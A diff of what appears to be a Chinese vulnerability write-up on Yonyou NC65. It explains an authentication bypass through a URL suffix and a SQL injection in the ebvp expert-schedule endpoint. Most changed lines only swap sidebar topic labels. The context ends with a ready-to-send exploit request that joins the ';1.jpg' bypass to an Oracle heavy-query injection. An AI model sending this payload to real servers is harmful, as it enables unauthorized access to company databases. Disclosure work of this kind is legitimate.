@@ -22,6 +22,14 @@ NC65
 
 先看对应的过滤
 
+深入探索
+
+计算机服务器
+
+网络安全
+
+网络
+
 nc/bs/ebvppub/filter/EbvpRequestFilter.java
 
 ```
@@ -61,11 +69,11 @@ public void init(FilterConfig arg0) throws ServletException {
 
 深入探索
 
-商务软件和生产力软件
-
-网络设备
-
 软件
+
+搜索引擎
+
+计算机科学
 
 我们只需要 URL 里有这些后缀或者url 就可以绕过权限校验
 
@@ -77,7 +85,7 @@ public void init(FilterConfig arg0) throws ServletException {
 
 直接看 `EvalScheduleController.java` 的业务逻辑处理
 
-计算机安全
+数据管理
 
 ```
 package nc.bs.ebvp.expeval;
@@ -167,7 +175,7 @@ public Object[] queryMDVOByPks(Class parentCls, String[] pks, DefaultTransBizExt
 
 最终通过GET请求，将 `pkevalset` 参数值拼接进SQL语句where子语句中调用 executeQuery 直接执行，无任何过滤或校验造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，朴实无华。
 
-数据管理
+编程
 
 # 漏洞复现
 
@@ -175,7 +183,7 @@ public Object[] queryMDVOByPks(Class parentCls, String[] pks, DefaultTransBizExt
 
 漏洞利用示例
 
-编程
+黑客与破解
 
 ```
 GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1'+OR+1111%3d(SELECT+COUNT(*)+FROM+ALL_USERS+T1,ALL_USERS+T2,ALL_USERS+T3,ALL_USERS+T4,ALL_USERS+T5)-- HTTP/1.1
